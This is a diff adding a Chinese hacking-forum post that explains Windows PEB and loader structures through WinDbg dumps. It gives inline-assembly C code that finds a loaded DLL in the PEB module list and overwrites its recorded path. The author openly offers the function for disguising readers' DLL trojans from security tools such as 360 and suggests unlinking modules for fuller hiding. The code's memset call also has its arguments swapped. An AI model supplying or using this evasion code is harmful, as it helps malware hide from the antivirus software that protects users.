@@ -1,0 +1,228 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+篡改DLL模块信息-----实现DLL的隐藏与伪装
+D8888D主贴内容-------------------------------------------------------
+ 
+
+完整的文章和代码在附件中
+
+
+如今有很多关于进程隐藏，文件隐藏，注册表隐藏的资料出现，但关于DLL隐藏的资料一直很少见，本文实现用户态篡改DLL模块信息实现DLL的隐藏与伪装。
+大家都知道,操作系统是通过遍历链表来获取进程信息的。其实DLL信息也是在链表中存储的。
+研究过shellcode的人想必都知道FS指向当前线程的TEB(Thread EnvironmentBlock)，即FS:0指向TEB。
+使用windbg观察可看到以下结果： > dg @fs
+
+Selector   Base     Limit     Type    DPL   Size  Gran Pres
+
+-------- -------- -------- ---------- --- ------- ---- ----
+
+  0038   7ffde000 00000fff Data RW Ac  3    Big   Byte  P
+
+
+
+> r $teb
+
+$teb=7ffde000
+复制代码可以发现TEB的地址和FS所指向的地址是相同的。
+而TEB[0x30]是一个指向当前进程的PEB(Process Environment Block)的指针
+使用WINDBG可以观察到以下结果： > dt -v -r ntdll!_TEB
+
+struct _TEB, 64 elements, 0xfb4 bytes
+
+   +0x000 NtTib            : struct _NT_TIB, 8 elements, 0x1c bytes
+
+   +0x01c EnvironmentPointer : Ptr32 to Void
+
+   +0x020 ClientId         : struct _CLIENT_ID, 2 elements, 0x8 bytes
+
+   +0x028 ActiveRpcHandle  : Ptr32 to Void
+
+   +0x02c ThreadLocalStoragePointer : Ptr32 to Void
+
+   +0x030 ProcessEnvironmentBlock : Ptr32 to struct _PEB, 66 elements, 0x210 bytes
+复制代码PEB中包含很多很重要的辅助数据结构，包含了所有加载模块的基址，名称信息，PEB的结构我们用WINDBG可以观察到： > dt -v -r ntdll!_PEB
+
+struct _PEB, 66 elements, 0x210 bytes
+
+   +0x000 InheritedAddressSpace : UChar
+
+   +0x001 ReadImageFileExecOptions : UChar
+
+   +0x002 BeingDebugged    : UChar
+
+   +0x003 SpareBool        : UChar
+
+   +0x004 Mutant           : Ptr32 to Void
+
+   +0x008 ImageBaseAddress : Ptr32 to Void
+
+   +0x00c Ldr              : Ptr32 to struct _PEB_LDR_DATA, 7 elements, 0x28 bytes
+复制代码PEB[0x0c]指向PEB_LDR_DATA结构，该结构有三个成员均可用于枚举当前进程空间中
+的模块列表，区别在于加载顺序、内存顺序、初始化顺序。这是三个双向循环链表，
+微软的WRK（Windows Reseach Kernel）源码中有它的结构： typedef struct _PEB_LDR_DATA {
+
+    ULONG Length;
+
+    BOOLEAN Initialized;
+
+    HANDLE SsHandle;
+
+    LIST_ENTRY InLoadOrderModuleList;
+
+    LIST_ENTRY InMemoryOrderModuleList;
+
+    LIST_ENTRY InInitializationOrderModuleList;
+
+    PVOID EntryInProgress;
+
+} PEB_LDR_DATA, *PPEB_LDR_DATA;
+复制代码使用WINDBG也可以观察到它： > dt -v -r ntdll!_PEB_LDR_DATA
+
+struct _PEB_LDR_DATA, 7 elements, 0x28 bytes
+
+   +0x000 Length           : Uint4B
+
+   +0x004 Initialized      : UChar
+
+   +0x008 SsHandle         : Ptr32 to Void
+
+   +0x00c InLoadOrderModuleList : struct _LIST_ENTRY, 2 elements, 0x8 bytes
+
+   +0x014 InMemoryOrderModuleList : struct _LIST_ENTRY, 2 elements, 0x8 bytes
+
+   +0x01c InInitializationOrderModuleList : struct _LIST_ENTRY, 2 elements, 0x8 bytes
+
+   +0x024 EntryInProgress  : Ptr32 to Void
+复制代码三个结构其实是差不多的，我们这里就用InLoadOrderModuleList来遍历DLL模块的加载基址吧。
+_PEB_LDR_DATA是_LIST_ENTRY类型的结构：
+_LIST_ENTRY的结构如下： > dt -v -r ntdll!_LIST_ENTRY
+
+struct _LIST_ENTRY, 2 elements, 0x8 bytes
+
+   +0x000 Flink            : Ptr32 to struct _LIST_ENTRY, 2 elements, 0x8 bytes
+
+   +0x004 Blink            : Ptr32 to struct _LIST_ENTRY, 2 elements, 0x8 bytes
+复制代码双向循环链表的结点指向一个LDR_MODULE结构：
+LDR_MODULE的结构如下： typedef struct _LDR_MODULE
+
+{
+
+    LIST_ENTRY        InLoadOrderModuleList;            
+
+    LIST_ENTRY        InMemoryOrderModuleList;          
+
+    LIST_ENTRY        InInitializationOrderModuleList;  
+
+    PVOID             BaseAddress;                      
+
+    PVOID             EntryPoint;                       
+
+    ULONG             SizeOfImage;                      
+
+    UNICODE_STRING    FullDllName;                      
+
+    UNICODE_STRING    BaseDllName;                      
+
+    ULONG             Flags;                            
+
+    SHORT             LoadCount;                        
+
+    SHORT             TlsIndex;                         
+
+    LIST_ENTRY        HashTableEntry;                   
+
+    ULONG             TimeDateStamp;                    
+
+                                                        
+
+} LDR_MODULE, *PLDR_MODULE;
+复制代码这里我们主要关注BaseAddress和FullDllName，BaseAddress的偏移是 0x8+0x8+0x8=0x18，FullDllName的偏移是0x18+0x4+0x4+0x4=0x24。FullDllName的类型是UNICODE_STRING， 
+UNICODE_STRING在MSDN中的定义如下 typedef struct _UNICODE_STRING {
+
+  USHORT  Length;
+
+  USHORT  MaximumLength;
+
+  PWSTR  Buffer;
+
+} UNICODE_STRING *PUNICODE_STRING;
+复制代码USHORT是2字节的，所以我们可以得到FullDllName的长度在偏移0x24处，FullDllName的内容在偏移0x28处。
+现在我们只要将我们DLL模块的基址传递进来，再与BaseAddress相比较，就可以找到内存中我们DLL模块信息的地址了！然后就可以将它篡改！
+剩下的就是代码实现了，我把关键部分贴出来，加上了详细的注释，完整的代码在附件中。 void Hide(DWORD Address)
+
+{
+
+        LPWSTR name;
+
+        DWORD size_1;
+
+
+
+        __asm mov ecx, [Address]//将DLL基址存入ecx
+
+
+
+        __asm mov eax, fs:[0x30] //获取PEB基址
+
+        __asm mov eax, [eax + 0xc] //获取PEB_LDR_DATA结构基址
+
+        __asm add eax, 0xc //获取InLoadOrderModuleList结构基址
+
+        __asm mov esi, [eax] //将InLoadOrderModuleList结构基址保存至ESI中
+
+
+
+loop2:
+
+        __asm cmp ecx, [esi + 0x18] //比较和我们模块的基址是否相同
+
+        __asm je wancheng//找到了？
+
+        __asm mov esi, [esi] //没找到则跳至链表下一项
+
+        __asm jmp loop2//继续
+
+wancheng:
+
+        __asm movzx edi, [esi + 0x24] //得到DLL信息的长度
+
+        __asm inc edi//加1
+
+        __asm inc edi//加1
+
+        __asm mov [size_1], edi//存入字串的大小
+
+        __asm mov ecx, [esi + 0x28]
+
+        __asm mov [name], ecx//存入字符串的内容
+
+
+
+        memset(name, size_1, 0); //先将模块信息清空
+
+        wcscpy(name,L"躲猫猫");//换成篡改的信息
+
+}
+复制代码篡改的部分是在DLL中实现的，大家以后只要使用hide函数就可以篡改自己DLL木马的模块信息了。
+我们使用一个简单的程序(附件中的test.exe)来测试这个DLL。功能只是加载该DLL. HMODULE hModule=LoadLibrary("Keyboard.dll");
+
+        if(hModule==NULL)
+
+        {
+
+                return 0;
+
+        }
+复制代码运行结果如下：
+
+图1
+也可以将信息伪装成其他的路径。
+
+图2
+其实也完全可以将信息全部清空，如图：
+
+图3
+        本文是介绍用户态涂抹DLL信息，可以PASS大多数安全软件，如syscheck，360,超级巡警等，但由于ICESWORD使用更为底层的数据结构，所以不能绕过。其实各位读者也可以将DLL信息在InLoadOrderModuleList中断链，可以实现比较彻底的隐藏，我实现了，但是不太稳定，我认为伪装比隐藏好，隐藏是一种代价更高的对抗方式，会导致不稳定和各方面的问题。
+ [img]http://www.t00ls.net/images/attachicons/rar.gif[/img][url=http://www.t00ls.net/attachment.php?aid=NzM3NnxkOWY4MjBlNXwxMjg2NDgwNDk2fDE5ODBtSHVhTGNsc3V4MmJ0Q1hQQndCTGYwQXBSK1drNGhSVVBEcmpyU0k3KzFN]链接标记复件 篡改DLL模块信息-----实现DLL的隐藏与伪装.rar[/url] (739.29 KB) 下载次数:18
+2010-7-8 10:23
